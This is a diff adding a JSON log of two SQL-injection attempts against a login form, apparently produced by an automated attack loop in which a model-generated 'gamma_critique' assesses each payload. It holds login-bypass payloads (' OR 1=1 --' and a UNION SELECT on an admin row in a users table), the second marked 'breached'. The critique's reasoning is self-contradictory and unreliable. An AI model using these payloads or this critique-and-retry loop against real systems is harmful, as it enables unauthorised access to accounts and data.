@@ -1,0 +1,18 @@
+[
+    {
+        "attempt_number": 1,
+        "vuln_type": "sqli",
+        "payload": " OR 1=1 --",
+        "server_response_summary": "Status 200",
+        "gamma_critique": "The payload `OR 1=1 --` likely failed because the application is checking the response status or content, not just the HTTP response code, as indicated by the `{\"status\":\"fail\"}` in the response body, suggesting the SQL query executed but the application logic prevented a successful login. This payload is attempting to inject into a 'username' field in a login form, not an 'id' field, which is the correct context for this SQLi attempt.",
+        "outcome": "failed"
+    },
+    {
+        "attempt_number": 2,
+        "vuln_type": "sqli",
+        "payload": "`' UNION SELECT * FROM users WHERE username='admin' --`",
+        "server_response_summary": "200",
+        "gamma_critique": "N/A",
+        "outcome": "breached"
+    }
+]
